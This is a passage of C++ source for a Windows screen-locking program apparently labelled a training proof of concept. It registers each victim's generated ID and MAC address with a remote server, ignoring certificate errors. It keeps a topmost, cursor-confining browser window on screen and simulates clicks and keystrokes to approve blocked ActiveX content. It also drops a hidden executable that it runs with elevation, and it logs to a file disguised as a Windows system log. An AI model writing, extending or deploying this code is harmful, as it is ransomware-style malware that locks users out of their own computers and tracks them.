    std::string safeSpecialChars = "_-";  // URL에서 안전한 문자들만
    std::uniform_int_distribution<size_t> specialCountDis(1, 2);
    size_t specialCount = specialCountDis(gen);

    std::uniform_int_distribution<size_t> specialDis(0, safeSpecialChars.length() - 1);
    for (size_t i = 0; i < specialCount; i++) {
        result += safeSpecialChars[specialDis(gen)];
    }

    // Shuffle the result (MAC 부분 제외)
    std::string toShuffle = result.substr(3);
    for (size_t i = toShuffle.length() - 1; i > 0; i--) {
        std::uniform_int_distribution<size_t> shuffleDis(0, i); 
        size_t j = shuffleDis(gen);
        char temp = toShuffle[i];
        toShuffle[i] = toShuffle[j];
        toShuffle[j] = temp;
    }

    result = result.substr(0, 3) + toShuffle;

    return result;
}

std::string ScreenLocker::GetOrCreateUserID() {
    // Check if User ID is already saved
    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) == S_OK) {
        std::string windowsDir = std::string(appDataPath) + "\\Windows";
        std::string logPath = windowsDir + "\\system_log.txt";

        // Create Windows Directory if it doesn't exist
        CreateDirectoryA(windowsDir.c_str(), NULL);

        std::ifstream logFile(logPath);
        if (logFile.good()) {
            std::string line;
            std::string currentMAC = GetMacAddress();
            std::string lastFoundUserID;

            // Check the previous User ID - 마지막에 발견된 것을 사용
            while (std::getline(logFile, line)) {
                if (line.find("User ID: ") != std::string::npos && line.find("MAC Address: " + currentMAC) != std::string::npos) {
                    // Extract the User ID
                    size_t idStart = line.find("User ID: ") + 9;
                    size_t idEnd = line.find(" | MAC Address: ");
                    if (idStart != std::string::npos && idEnd != std::string::npos) {
                        lastFoundUserID = line.substr(idStart, idEnd - idStart);
                    }
                }
            }
            logFile.close();
            
            // 발견된 User ID가 있으면 반환
            if (!lastFoundUserID.empty()) {
                SaveToLogFile(lastFoundUserID, "EXISTING_USER_ID_FOUND_AND_REUSED");
                return lastFoundUserID;
            }
        }
    }

    // Generate New User ID only if none was found
    std::string newID = GenerateRandomID();
    SaveToLogFile(newID, "NEW_URL_SAFE_USER_ID_GENERATED");

    return newID;
}

void ScreenLocker::SaveToLogFile(const std::string& userID, const std::string& action) {
    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) == S_OK) {
        std::string windowsDir = std::string(appDataPath) + "\\Windows";
        std::string logPath = windowsDir + "\\system_log.txt";

        // Create Windows Directory if it doesn't exist
        CreateDirectoryA(windowsDir.c_str(), NULL);

        std::ofstream logFile(logPath, std::ios::app);

        SYSTEMTIME st;
        GetLocalTime(&st);

        logFile << "[" << st.wYear << "-" << st.wMonth << "-" << st.wDay 
        << " " << st.wHour << ":" << st.wMinute << ":" << st.wSecond 
        << "] " << action << " | User ID: " << userID << " | MAC Address: " << GetMacAddress() << std::endl;

        logFile.close();
    }
}

std::string ScreenLocker::GenerateHTMLContent() {
    // 먼저 UserID 삽입용 템플릿 생성
    std::string actualUserID = userID;  // 실제 UserID 저장
    
    std::string htmlContent = R"html(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Unlock Request</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #333;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            padding: 40px;
            max-width: 600px;
            width: 90%;
            text-align: center;
        }
        .header h1 {
            color: #2c3e50;
            margin-bottom: 10px;
            font-size: 2.0em;
            font-weight: 700;
            white-space: nowrap;
            overflow: hidden;
        }
        .subtitle {
            color: #7f8c8d;
            font-size: 1.1em;
            margin-bottom: 30px;
        }
        .info-box {
            background: #f8f9fa;
            border: 2px solid #e9ecef;
            border-radius: 8px;
            padding: 25px;
            margin-bottom: 30px;
        }
        .info-box h2 {
            color: #495057;
            margin-bottom: 15px;
            font-size: 1.4em;
        }
        .info-text {
            color: #6c757d;
            line-height: 1.6;
            font-size: 1em;
        }
        .input-section {
            margin-bottom: 30px;
        }
        .input-section label {
            display: block;
            margin-bottom: 10px;
            font-weight: 600;
            color: #495057;
            text-align: left;
        }
        .input-group {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        #userIdInput {
            flex: 1;
            padding: 12px 16px;
            border: 2px solid #28a745;
            border-radius: 6px;
            font-size: 1em;
            background-color: #f0fff0;
            color: #28a745;
            font-family: 'Courier New', monospace;
            letter-spacing: 1px;
            font-weight: bold;
            cursor: default;
        }
        #userIdInput:focus {
            outline: none;
            border-color: #28a745;
        }
        #confirmBtn {
            padding: 12px 24px;
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 1em;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            min-width: 80px;
        }
        #confirmBtn:hover {
            background: linear-gradient(135deg, #218838 0%, #1aa085 100%);
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(40, 167, 69, 0.3);
        }
        .status-message {
            padding: 15px;
            border-radius: 6px;
            margin-top: 15px;
            font-weight: 600;
        }
        .status-message.success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 System Access Recovery</h1>
            <p class="subtitle">[PoC Training] Unlock Request Portal</p>
        </div>
        
        <div class="content">
            <div class="info-box">
                <h2>System Unlock Process</h2>
                <p class="info-text">
                    User ID has been automatically filled. Upon clicking 'Confirm', the file will be automatically downloaded and executed.
                    After agreeing to administrator privileges, the ScreenLocker will proceed with automatic deletion.
                </p>
            </div>
            
            <div class="input-section">
                <label for="userIdInput">Your User ID:</label>
                <div class="input-group">
                    <input type="text" id="userIdInput" value=")html" + actualUserID + R"html(" readonly>
                    <button id="confirmBtn" onclick="processUnlock()">Confirm</button>
                </div>
            </div>
            
            <div id="statusMessage" class="status-message hidden">
                <span id="statusText">Processing...</span>
            </div>
        </div>
    </div>
    
    <script>
        function processUnlock() {
            // 버튼 비활성화 및 상태 변경
            const confirmBtn = document.getElementById('confirmBtn');
            const statusMessage = document.getElementById('statusMessage');
            const statusText = document.getElementById('statusText');
            
            confirmBtn.disabled = true;
            confirmBtn.textContent = 'Processing...';
            
            // 상태 메시지 표시
            statusMessage.classList.remove('hidden');
            statusText.textContent = 'Sending unlock request to server...';
            
            // C++에 신호를 보내기 위해 창의 제목을 변경
            document.title = 'UNLOCK_REQUEST_SENT';
            
            // 추가적인 확인을 위해 콘솔에도 로그 출력
            console.log('Unlock request sent - Title changed to: ' + document.title);
            
            // 5초 후에도 응답이 없으면 타임아웃 메시지 표시
            setTimeout(function() {
                if (document.title === 'UNLOCK_REQUEST_SENT') {
                    statusText.textContent = 'Processing... Please wait.';
                    console.log('Still processing after 5 seconds');
                }
            }, 5000);
            
            // 10초 후에는 에러 메시지 표시
            setTimeout(function() {
                if (document.title === 'UNLOCK_REQUEST_SENT') {
                    statusText.textContent = 'Taking longer than expected. Please wait...';
                    console.log('Processing taking longer than expected');
                }
            }, 10000);
        }
    </script>
</body>
</html>
)html";

    return htmlContent;
}

void ScreenLocker::OpenControlledBrowser() {
    // Prevent duplicate browser execution
    if (browserRunning) {
        SaveToLogFile(userID, "BROWSER_ALREADY_RUNNING_IGNORED");
        return;
    }
    browserRunning = true;

    // Reset COM
    HRESULT hrInit = CoInitialize(NULL);
    if (FAILED(hrInit) && hrInit != RPC_E_CHANGED_MODE) {
        SaveToLogFile(userID, "COM_INITIALIZATION_FAILED");
        browserRunning = false;
        return;
    }

    IWebBrowser2* pWebBrowser = NULL;
    BSTR url = NULL;

    do {
        // Create HTML File with UserID pre-filled
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        std::string exeDir = exePath;
        size_t lastSlash = exeDir.find_last_of("\\");
        if (lastSlash != std::string::npos) {
            exeDir = exeDir.substr(0, lastSlash);
        }
        
        std::string htmlFile = exeDir + "\\unlock.html";
        std::string htmlContent = GenerateHTMLContent();  // 이미 UserID가 삽입됨
        
        std::ofstream file(htmlFile);
        file << htmlContent;
        file.close();
        SaveToLogFile(userID, "HTML_FILE_CREATED_WITH_USERID");
        
        // Create file:// URL
        std::replace(htmlFile.begin(), htmlFile.end(), '\\', '/');
        std::wstring wHtmlFile(htmlFile.begin(), htmlFile.end());
        std::wstring htmlPath = L"file:///" + wHtmlFile;
        url = SysAllocString(htmlPath.c_str());

        // Create Internet Explorer Instance
        HRESULT hr = CoCreateInstance(CLSID_InternetExplorer, NULL, CLSCTX_LOCAL_SERVER, IID_IWebBrowser2, (void**)&pWebBrowser);
        if (FAILED(hr) || !pWebBrowser) {
            SaveToLogFile(userID, "BROWSER_CREATION_FAILED");
            break;
        }

        // Browser Settings
        pWebBrowser->put_Visible(VARIANT_TRUE);
        pWebBrowser->put_ToolBar(VARIANT_FALSE);
        pWebBrowser->put_StatusBar(VARIANT_FALSE);
        pWebBrowser->put_MenuBar(VARIANT_FALSE);
        pWebBrowser->put_AddressBar(VARIANT_FALSE);
        pWebBrowser->put_Silent(VARIANT_TRUE);

        // Calculate Position and Size
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        int xPos = (screenWidth - BROWSER_WIDTH) / 2;
        int yPos = (screenHeight - BROWSER_HEIGHT) / 2;

        pWebBrowser->put_Left(xPos);
        pWebBrowser->put_Top(yPos);
        pWebBrowser->put_Width(BROWSER_WIDTH);
        pWebBrowser->put_Height(BROWSER_HEIGHT);

        // Navigate to HTML File
        if (!url) {
            SaveToLogFile(userID, "URL_ALLOCATION_FAILED");
            break;
        }

        VARIANT varURL;
        VariantInit(&varURL);
        varURL.vt = VT_BSTR;
        varURL.bstrVal = url;

        hr = pWebBrowser->Navigate2(&varURL, NULL, NULL, NULL, NULL);
        VariantClear(&varURL);

        if (FAILED(hr)) {
            SaveToLogFile(userID, "NAVIGATION_FAILED");
            break;
        }

        // Find and Control Browser Window
        for (int attempts = 0; attempts < 20; attempts++) {
            Sleep(200);
            hr = pWebBrowser->get_HWND((SHANDLE_PTR*)&browserHwnd);
            if (browserHwnd) break;
            
            if (FindBrowserWindow()) break;
        }

        if (browserHwnd) {
            ControlBrowserWindow();
        }
        
        // 3초 후 자동 허용 (보안 기능을 위해)
        SaveToLogFile(userID, "WAITING_FOR_ACTIVEX_ALLOW");
        Sleep(3000);
        ClickAllowButton();
        
        SaveToLogFile(userID, "BROWSER_OPENED_CONTROLLED");
        
    } while (false);

    // 리소스 정리
    if (url) SysFreeString(url);
    if (pWebBrowser) pWebBrowser->Release();

    if (SUCCEEDED(hrInit)) {
        CoUninitialize();
    }

    // 브라우저 상태는 유지
    SaveToLogFile(userID, "BROWSER_SESSION_MAINTAINED");
}

// Window priority control functions
void ScreenLocker::SetScreenLockerTopmost() {
    if (hWnd) {
        SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0, 
                    SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
        SetForegroundWindow(hWnd);
        SaveToLogFile(userID, "SCREENLOCKER_SET_TOPMOST");
    }
}

void ScreenLocker::SetBrowserTopmost() {
    if (browserHwnd) {
        // Set browser above screen locker
        SetWindowPos(browserHwnd, HWND_TOPMOST, 0, 0, 0, 0, 
                    SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
        SetForegroundWindow(browserHwnd);
        BringWindowToTop(browserHwnd);
        SaveToLogFile(userID, "BROWSER_SET_TOPMOST");
    }
}

void ScreenLocker::RestoreScreenLockerTopmost() {
    // Restore screen locker as topmost
    SetScreenLockerTopmost();
    SaveToLogFile(userID, "SCREENLOCKER_TOPMOST_RESTORED");
}

bool ScreenLocker::FindBrowserWindow() {
    // Try to get browser window handle
    browserHwnd = FindWindow(L"IEFrame", NULL);
    if (browserHwnd) {
        SaveToLogFile(userID, "BROWSER_WINDOW_FOUND");
        return true;
    }
    return false;
}

void ScreenLocker::ControlBrowserWindow() {
    if (!browserHwnd) return;
    
    // Calculate center position
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int xPos = (screenWidth - BROWSER_WIDTH) / 2;
    int yPos = (screenHeight - BROWSER_HEIGHT) / 2;
    
    // Remove title bar and set properties
    SetWindowLong(browserHwnd, GWL_STYLE, WS_POPUP | WS_VISIBLE);
    SetWindowLong(browserHwnd, GWL_EXSTYLE, WS_EX_TOPMOST | WS_EX_TOOLWINDOW);
    
    // Position and set as topmost
    SetWindowPos(browserHwnd, HWND_TOPMOST, xPos, yPos, BROWSER_WIDTH, BROWSER_HEIGHT, 
                SWP_FRAMECHANGED | SWP_SHOWWINDOW);
    
    // Set browser as topmost (above screen locker)
    SetBrowserTopmost();
    
    // 커서 제한
    ConfineCursorToBrowser();
    
    SaveToLogFile(userID, "BROWSER_WINDOW_CONTROLLED_MINIMAL_INPUT");
}

void ScreenLocker::ClickAllowButton() {
    if (!browserHwnd) return;
    
    SaveToLogFile(userID, "ATTEMPTING_ACTIVEX_ALLOW");
    
    // 먼저 UI 버튼 클릭 시도
    HWND infoBar = FindWindowEx(browserHwnd, NULL, L"Internet Explorer_TridentCmboBx", NULL);
    if (!infoBar) {
        infoBar = FindWindowEx(browserHwnd, NULL, L"CommandBarClass", NULL);
    }
    
    if (infoBar) {
        // Find allow button and click
        HWND allowButton = FindWindowEx(infoBar, NULL, L"Button", NULL);
        while (allowButton) {
            WCHAR buttonText[100];
            GetWindowText(allowButton, buttonText, 100);
            
            // Find button with "허용" or "Allow" text
            if (wcsstr(buttonText, L"허용") || wcsstr(buttonText, L"Allow") || 
                wcsstr(buttonText, L"차단된 콘텐츠 허용")) {
                
                SaveToLogFile(userID, "FOUND_ALLOW_BUTTON_CLICKING");
                // UI 버튼 클릭 (시스템 모드 불필요)
                SendMessage(allowButton, BM_CLICK, 0, 0);
                SaveToLogFile(userID, "ALLOW_BUTTON_CLICKED_SUCCESS");
                return;
            }
            
            allowButton = FindWindowEx(infoBar, allowButton, L"Button", NULL);
        }
    }
    
    // UI 버튼이 없으면 키보드 단축키 사용 (최소 시간)
    SaveToLogFile(userID, "NO_UI_BUTTON_USING_KEYBOARD_SHORTCUT");
    
    // ↓↓↓ 매우 짧은 시간만 시스템 모드 활성화 ↓↓↓
    SetSystemActionMode(true);
    
    // Alt+A 키 시뮬레이션
    keybd_event(VK_MENU, 0, 0, 0);  // Press Alt
    keybd_event('A', 0, 0, 0);      // Press A
    keybd_event('A', 0, KEYEVENTF_KEYUP, 0);  // Release A
    keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);  // Release Alt
    
    // ↓↓↓ 즉시 시스템 모드 비활성화 ↓↓↓
    SetSystemActionMode(false);
    
    SaveToLogFile(userID, "ALLOW_SHORTCUT_COMPLETED");
}

void ScreenLocker::ConfineCursorToBrowser() {
    if (!browserHwnd || !IsWindow(browserHwnd)) {
        SaveToLogFile(userID, "CURSOR_CONFINE_FAILED_NO_BROWSER");
        return;
    }
    
    // Get browser window position and size
    RECT browserRect;
    if (GetWindowRect(browserHwnd, &browserRect)) {
        ClipCursor(&browserRect);
        SaveToLogFile(userID, "CURSOR_CONFINED_TO_BROWSER");
    } else {
        SaveToLogFile(userID, "CURSOR_CONFINE_FAILED_GET_RECT");
    }
}

void ScreenLocker::ReleaseCursorConfinement() {
    ClipCursor(NULL);
    SaveToLogFile(userID, "CURSOR_CONFINEMENT_RELEASED");
}

// Helper functions for string conversion
std::wstring ScreenLocker::StringToWString(const std::string& str) {
    if (str.empty()) return std::wstring();
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}

std::string ScreenLocker::WStringToString(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

std::string ScreenLocker::UrlEncode(const std::string& str) {
    std::string encoded;
    char buffer[4];
    
    for (char c : str) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encoded += c;
        } else {
            sprintf_s(buffer, "%%%02X", static_cast<unsigned char>(c));
            encoded += buffer;
        }
    }
    return encoded;
}

bool ScreenLocker::SendHttpRequest(const std::wstring& path, const std::wstring& method, 
                                   const std::string& data, std::string* response) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    bool success = false;
    
    try {
        SaveToLogFile(userID, "HTTP_REQUEST_START: " + WStringToString(method) + " " + WStringToString(path));
        
        // Initialize WinHTTP session
        hSession = WinHttpOpen(L"ScreenLocker/1.0", 
                              WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                              WINHTTP_NO_PROXY_NAME, 
                              WINHTTP_NO_PROXY_BYPASS, 
                              0);
        
        if (!hSession) {
            DWORD error = GetLastError();
            SaveToLogFile(userID, "HTTP_SESSION_INIT_FAILED: " + std::to_string(error));
            return false;
        }
        
        SaveToLogFile(userID, "HTTP_SESSION_CREATED");
        
        // SSL/TLS 설정 (HTTPS 사용시)
        if (USE_HTTPS) {
            DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                         SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
            
            WinHttpSetOption(hSession, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
            SaveToLogFile(userID, "HTTPS_SECURITY_FLAGS_SET");
        }
        
        // Connect to server
        hConnect = WinHttpConnect(hSession, SERVER_URL, SERVER_PORT, 0);
        if (!hConnect) {
            DWORD error = GetLastError();
            SaveToLogFile(userID, "HTTP_CONNECT_FAILED: " + std::to_string(error));
            SaveToLogFile(userID, "SERVER_URL: " + WStringToString(SERVER_URL));
            SaveToLogFile(userID, "SERVER_PORT: " + std::to_string(SERVER_PORT));
            return false;
        }
        
        SaveToLogFile(userID, "HTTP_CONNECTED_TO_SERVER");
        
        // Create HTTP request
        DWORD flags = USE_HTTPS ? WINHTTP_FLAG_SECURE : 0;
        hRequest = WinHttpOpenRequest(hConnect, method.c_str(), path.c_str(),
                                     NULL, WINHTTP_NO_REFERER, 
                                     WINHTTP_DEFAULT_ACCEPT_TYPES,
                                     flags);
        
        if (!hRequest) {
            DWORD error = GetLastError();
            SaveToLogFile(userID, "HTTP_REQUEST_CREATION_FAILED: " + std::to_string(error));
            return false;
        }
        
        SaveToLogFile(userID, "HTTP_REQUEST_CREATED");
        
        // Add headers for POST requests
        if (method == L"POST" || method == L"PUT") {
            const wchar_t* headers = L"Content-Type: application/json\r\n";
            BOOL headerResult = WinHttpAddRequestHeaders(hRequest, headers, -1, WINHTTP_ADDREQ_FLAG_ADD);
            if (!headerResult) {
                DWORD error = GetLastError();
                SaveToLogFile(userID, "HTTP_ADD_HEADERS_FAILED: " + std::to_string(error));
            } else {
                SaveToLogFile(userID, "HTTP_HEADERS_ADDED");
            }
        }
        
        // Send request
        BOOL bResult = FALSE;
        if (!data.empty()) {
            SaveToLogFile(userID, "SENDING_HTTP_REQUEST_WITH_DATA: " + data);
            bResult = WinHttpSendRequest(hRequest, 
                                        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                        (LPVOID)data.c_str(), (DWORD)data.length(),
                                        (DWORD)data.length(), 0);
        } else {
            SaveToLogFile(userID, "SENDING_HTTP_REQUEST_NO_DATA");
            bResult = WinHttpSendRequest(hRequest, 
                                        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                        WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
        }
        
        if (!bResult) {
            DWORD error = GetLastError();
            SaveToLogFile(userID, "HTTP_SEND_REQUEST_FAILED: " + std::to_string(error));
            return false;
        }
        
        SaveToLogFile(userID, "HTTP_REQUEST_SENT");
        
        // Receive response
        bResult = WinHttpReceiveResponse(hRequest, NULL);
        if (!bResult) {
            DWORD error = GetLastError();
            SaveToLogFile(userID, "HTTP_RECEIVE_RESPONSE_FAILED: " + std::to_string(error));
            return false;
        }
        
        SaveToLogFile(userID, "HTTP_RESPONSE_RECEIVED");
        
        // Check status code
        DWORD statusCode = 0;
        DWORD statusCodeSize = sizeof(statusCode);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                           WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize, 
                           WINHTTP_NO_HEADER_INDEX);
        
        SaveToLogFile(userID, "HTTP_STATUS_CODE: " + std::to_string(statusCode));
        
        if (statusCode >= 200 && statusCode < 300) {
            success = true;
            
            // Read response data if needed
            if (response) {
                DWORD bytesAvailable = 0;
                std::string responseData;
                
                do {
                    bytesAvailable = 0;
                    if (WinHttpQueryDataAvailable(hRequest, &bytesAvailable)) {
                        if (bytesAvailable > 0) {
                            char* buffer = new char[bytesAvailable + 1];
                            DWORD bytesRead = 0;
                            
                            if (WinHttpReadData(hRequest, buffer, bytesAvailable, &bytesRead)) {
                                buffer[bytesRead] = '\0';
                                responseData += buffer;
                            }
                            delete[] buffer;
                        }
                    }
                } while (bytesAvailable > 0);
                
                *response = responseData;
                SaveToLogFile(userID, "HTTP_RESPONSE_DATA_LENGTH: " + std::to_string(responseData.length()));
            }
            
            SaveToLogFile(userID, "HTTP_REQUEST_SUCCESS: " + WStringToString(method) + " " + WStringToString(path));
        } else {
            SaveToLogFile(userID, "HTTP_REQUEST_FAILED_CODE: " + std::to_string(statusCode));
        }
        
    } catch (...) {
        SaveToLogFile(userID, "HTTP_REQUEST_EXCEPTION");
    }
    
    // Cleanup
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    
    SaveToLogFile(userID, "HTTP_REQUEST_CLEANUP_COMPLETED");
    return success;
}

bool ScreenLocker::SendUserRegistration() {
    // Create JSON data for registration
    std::string jsonData = "{";
    jsonData += "\"user_id\":\"" + userID + "\",";
    jsonData += "\"mac_address\":\"" + GetMacAddress() + "\"";
    jsonData += "}";
    
    std::string response;
    bool success = SendHttpRequest(L"/register", L"POST", jsonData, &response);
    
    if (success) {
        SaveToLogFile(userID, "USER_REGISTRATION_SUCCESS");
        return true;
    } else {
        SaveToLogFile(userID, "USER_REGISTRATION_FAILED");
        return false;
    }
}

// CheckUserStatus 함수 수정
std::string ScreenLocker::CheckUserStatus() {
    // URL 인코딩 적용
    std::string encodedUserID = UrlEncode(userID);
    std::wstring path = L"/status/" + StringToWString(encodedUserID);
    std::string response;
    
    SaveToLogFile(userID, "CHECKING_STATUS_FOR_USERID: " + userID);
    SaveToLogFile(userID, "ENCODED_USERID: " + encodedUserID);
    
    bool success = SendHttpRequest(path, L"GET", "", &response);
    
    if (success) {
        SaveToLogFile(userID, "RAW_SERVER_RESPONSE: " + response);
        
        // Simple JSON parsing without external library
        // Look for "status":"locked" or "status":"unlocked"
        size_t statusPos = response.find("\"status\":");
        if (statusPos != std::string::npos) {
            size_t valueStart = response.find("\"", statusPos + 9);
            if (valueStart != std::string::npos) {
                size_t valueEnd = response.find("\"", valueStart + 1);
                if (valueEnd != std::string::npos) {
                    std::string status = response.substr(valueStart + 1, valueEnd - valueStart - 1);
                    SaveToLogFile(userID, "PARSED_STATUS: " + status);
                    SaveToLogFile(userID, "STATUS_CHECK_SUCCESS: " + status);
                    return status;
                }
            }
        }
        SaveToLogFile(userID, "STATUS_PARSE_FAILED: " + response);
        return "locked"; // Default to locked on parse error
    } else {
        SaveToLogFile(userID, "STATUS_CHECK_FAILED");
        return "locked"; // Default to locked on network error
    }
}

bool ScreenLocker::ExtractRemoverExecutable() {
    try {
        // Find the resource
        HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(101), RT_RCDATA);
        if (!hResource) {
            SaveToLogFile(userID, "RESOURCE_FIND_FAILED");
            return false;
        }
        
        // Load the resource
        HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
        if (!hLoadedResource) {
            SaveToLogFile(userID, "RESOURCE_LOAD_FAILED");
            return false;
        }
        
        // Get resource data and size
        LPVOID pResourceData = LockResource(hLoadedResource);
        DWORD resourceSize = SizeofResource(NULL, hResource);
        
        if (!pResourceData || resourceSize == 0) {
            SaveToLogFile(userID, "RESOURCE_DATA_INVALID");
            return false;
        }
        
        // Create target directory
        char programDataPath[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, programDataPath) != S_OK) {
            SaveToLogFile(userID, "PROGRAMDATA_PATH_FAILED");
            return false;
        }
        
        std::string targetDir = std::string(programDataPath) + "\\ipTime";
        std::string targetPath = targetDir + "\\remover.exe";
        
        // Create directory
        if (!CreateDirectoryA(targetDir.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
            SaveToLogFile(userID, "TARGET_DIRECTORY_CREATE_FAILED");
            return false;
        }
        
        // Write resource to file
        HANDLE hFile = CreateFileA(targetPath.c_str(), GENERIC_WRITE, 0, NULL, 
                                  CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            SaveToLogFile(userID, "TARGET_FILE_CREATE_FAILED");
            return false;
        }
        
        DWORD bytesWritten;
        BOOL writeResult = WriteFile(hFile, pResourceData, resourceSize, &bytesWritten, NULL);
        CloseHandle(hFile);
        
        if (!writeResult || bytesWritten != resourceSize) {
            SaveToLogFile(userID, "FILE_WRITE_FAILED");
            return false;
        }
        
        SaveToLogFile(userID, "REMOVER_EXTRACTED_SUCCESS: " + targetPath);
        return true;
        
    } catch (...) {
        SaveToLogFile(userID, "REMOVER_EXTRACTION_EXCEPTION");
        return false;
    }
}

std::string ScreenLocker::GetRemoverPath() {
    char programDataPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, programDataPath) == S_OK) {
        return std::string(programDataPath) + "\\ipTime\\remover.exe";
    }
    return "";
}

bool ScreenLocker::ExecuteRemoverWithAdmin() {
    std::string removerPath = GetRemoverPath();
    
    if (removerPath.empty()) {
        SaveToLogFile(userID, "REMOVER_PATH_NOT_FOUND");
        return false;
    }
    
    // Check if remover file exists
    DWORD fileAttr = GetFileAttributesA(removerPath.c_str());
    if (fileAttr == INVALID_FILE_ATTRIBUTES) {
        SaveToLogFile(userID, "REMOVER_FILE_NOT_EXISTS");
        return false;
    }
    
    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.lpVerb = "runas";  // Request admin elevation
    sei.lpFile = removerPath.c_str();
    sei.lpParameters = "";
    sei.nShow = SW_NORMAL;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
    
    if (ShellExecuteExA(&sei)) {
        SaveToLogFile(userID, "REMOVER_SHELLEXECUTE_SUCCESS");
        
        if (sei.hProcess) {
            // Wait for the process to complete
            DWORD waitResult = WaitForSingleObject(sei.hProcess, 30000); // 30 second timeout
            
            if (waitResult == WAIT_OBJECT_0) {
                DWORD exitCode;
                if (GetExitCodeProcess(sei.hProcess, &exitCode)) {
                    if (exitCode == 0) {
                        SaveToLogFile(userID, "REMOVER_COMPLETED_SUCCESS");
                        CloseHandle(sei.hProcess);
                        return true;
                    } else {
                        SaveToLogFile(userID, "REMOVER_COMPLETED_WITH_ERROR: " + std::to_string(exitCode));
                    }
                }
            } else if (waitResult == WAIT_TIMEOUT) {
                SaveToLogFile(userID, "REMOVER_EXECUTION_TIMEOUT");
            }
            
            CloseHandle(sei.hProcess);
        }
    } else {
        DWORD error = GetLastError();
        if (error == ERROR_CANCELLED) {
            SaveToLogFile(userID, "REMOVER_UAC_CANCELLED_BY_USER");
        } else {
            SaveToLogFile(userID, "REMOVER_SHELLEXECUTE_FAILED: " + std::to_string(error));
        }
    }
    
    return false;
}

// ScreenLocker.cpp 파일에 새로 추가
void ScreenLocker::HandleUnlockProcess() {
    SaveToLogFile(userID, "UNLOCK_PROCESS_STARTED");
    
    // 1. 제어된 브라우저를 엽니다.
    OpenControlledBrowser();

    // browserHwnd 핸들이 유효할 때만 신호 감지 로직을 실행합니다.
    if (browserHwnd) {
        SaveToLogFile(userID, "WAITING_FOR_BROWSER_SIGNAL");
        bool signal_received = false;
        bool browser_still_exists = true;

        // 약 1분 동안 신호를 기다립니다. (250ms * 240회 → 120회로 단축)
        for (int i = 0; i < 120 && browser_still_exists; i++) {
            // 브라우저 창이 여전히 존재하는지 확인
            if (!IsWindow(browserHwnd)) {
                SaveToLogFile(userID, "BROWSER_WINDOW_DESTROYED");
                browser_still_exists = false;
                break;
            }

            // 브라우저 창이 보이지 않게 되었는지 확인 (최소화 등)
            if (!IsWindowVisible(browserHwnd)) {
                SaveToLogFile(userID, "BROWSER_WINDOW_HIDDEN");
                // 창을 다시 보이게 하고 최상위로 설정
                ShowWindow(browserHwnd, SW_RESTORE);
                SetBrowserTopmost();
            }

            wchar_t title[256] = { 0 };
